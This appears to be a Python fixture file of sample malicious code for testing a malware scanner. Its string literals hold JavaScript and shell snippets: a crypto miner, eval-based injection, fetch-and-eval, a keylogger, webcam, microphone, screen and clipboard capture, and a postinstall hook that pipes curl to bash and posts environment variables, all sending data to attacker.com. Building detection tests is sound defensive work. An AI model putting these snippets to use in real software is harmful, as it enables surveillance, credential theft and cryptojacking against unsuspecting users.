#!/usr/bin/env python3
"""
Example test cases and samples of malicious code patterns
These files demonstrate what the scanner detects
"""

# =========================
# EXAMPLE 1: Cryptocurrency Mining
# =========================
example_crypto_mining = """
// Detected: XMRig Mining Script
const CoinHive = require('coinhive');

const miner = new CoinHive('pool.minexmr.com', 'YOUR_WALLET_ADDRESS');
miner.start();

// Monitor mining activity
setInterval(() => {
    console.log('Hashes per second:', miner.getHashesPerSecond());
}, 5000);

// CPU-intensive mining loop
while(true) {
    Math.sqrt(Math.random());
    for(let i = 0; i < 1000000; i++) {
        Math.pow(i, 2);
    }
}
"""

# =========================
# EXAMPLE 2: Arbitrary Code Execution
# =========================
example_ace = """
// Detected: eval() with user input
const userInput = process.argv[2];
eval(userInput);  // DANGEROUS!

// Detected: Function constructor with user data
const maliciousCode = process.env.CODE;
const executeFunc = new Function(maliciousCode);
executeFunc();

// Detected: Shell command injection
const command = 'ls ' + userInput;
require('child_process').exec(command);
"""

# =========================
# EXAMPLE 3: Remote Code Execution
# =========================
example_rce = """
// Detected: Download and execute from URL
fetch('http://attacker.com/malicious.js')
    .then(r => r.text())
    .then(code => eval(code));

// Detected: Dynamic import from user path
const moduleName = process.argv[2];
const module = await import(moduleName);

// Detected: Package installation from custom registry
exec('npm install --registry http://malicious.com');
"""

# =========================
# EXAMPLE 4: Data Collection - Keystroke Logging
# =========================
example_keylogger = """
// Detected: Keystroke logging
document.addEventListener('keydown', (event) => {
    const keystroke = event.key;
    // Send keystroke to attacker server
    fetch('http://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify({ key: keystroke })
    });
});

// Alternative detection pattern
function keyLogger(e) {
    const key = e.key;
    sendToServer(key);
}
document.onkeypress = keyLogger;
"""

# =========================
# EXAMPLE 5: Data Collection - Geolocation
# =========================
example_geolocation = """
// Detected: Geolocation tracking
navigator.geolocation.getCurrentPosition((position) => {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    
    // Send location to attacker
    fetch('http://attacker.com/track', {
        method: 'POST',
        body: JSON.stringify({
            latitude: latitude,
            longitude: longitude,
            timestamp: Date.now()
        })
    });
});
"""

# =========================
# EXAMPLE 6: Data Collection - Browser Info Exfiltration
# =========================
example_fingerprint = """
// Detected: Device fingerprinting and exfiltration
const userAgent = navigator.userAgent;
const platform = navigator.platform;
const language = navigator.language;

fetch('http://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
        userAgent: userAgent,
        platform: platform,
        language: language,
        timestamp: new Date().toISOString()
    })
});
"""

# =========================
# EXAMPLE 7: Webcam Access
# =========================
example_webcam = """
// Detected: Webcam access without user knowledge
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        // Send camera feed to attacker
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg');
        
        fetch('http://attacker.com/camera', {
            method: 'POST',
            body: imageData
        });
    });
"""

# =========================
# EXAMPLE 8: Microphone Access
# =========================
example_microphone = """
// Detected: Microphone access for audio recording
navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
        const mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.start();
        
        setTimeout(() => {
            mediaRecorder.stop();
            mediaRecorder.ondataavailable = (event) => {
                const audioBlob = event.data;
                
                // Send audio to attacker
                const formData = new FormData();
                formData.append('audio', audioBlob);
                fetch('http://attacker.com/audio', {
                    method: 'POST',
                    body: formData
                });
            };
        }, 30000); // Record 30 seconds
    });
"""

# =========================
# EXAMPLE 9: Screen Capture
# =========================
example_screencapture = """
// Detected: Screen capture/recording
navigator.mediaDevices.getDisplayMedia({ video: true })
    .then(stream => {
        const mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.start();
        
        // Record screen for exfiltration
        mediaRecorder.ondataavailable = (event) => {
            fetch('http://attacker.com/screen', {
                method: 'POST',
                body: event.data
            });
        };
    });
"""

# =========================
# EXAMPLE 10: Malicious Dependencies
# =========================
example_package_json = """{
  "name": "totally-legit-project",
  "version": "1.0.0",
  "dependencies": {
    "lodash": "^4.17.21",
    "expresss": "^4.17.1",
    "bcrypts": "^5.0.0",
    "monero-miner": "^1.2.3"
  },
  "scripts": {
    "postinstall": "curl http://attacker.com/setup.sh | bash",
    "start": "node index.js"
  }
}
"""

# =========================
# EXAMPLE 11: Post-install Hook Injection
# =========================
example_postinstall = """
#!/bin/bash
# Detected: Malicious post-install script

# Download and execute malware
curl http://attacker.com/malware.sh | bash

# Start cryptocurrency mining in background
node -e "require('child_process').spawn('xmrig', ['--pool', 'pool.minexmr.com'])" &

# Steal environment variables
env > /tmp/env_dump
curl -X POST --data-binary @/tmp/env_dump http://attacker.com/exfil

# Clean up tracks
rm -rf /tmp/env_dump
"""

# =========================
# EXAMPLE 12: Clipboard Hijacking
# =========================
example_clipboard = """
// Detected: Clipboard access for data theft
navigator.clipboard.readText()
    .then(text => {
        // Send clipboard content to attacker
        fetch('http://attacker.com/clipboard', {
            method: 'POST',
            body: JSON.stringify({
                clipboard_content: text,
                timestamp: Date.now()
            })
        });
    });
"""

if __name__ == "__main__":
    print("Example malicious code patterns for testing the scanner")
    print("\nRun the scanner on files containing these patterns to test detection:")
    print("python scanner.py /path/to/test/files")
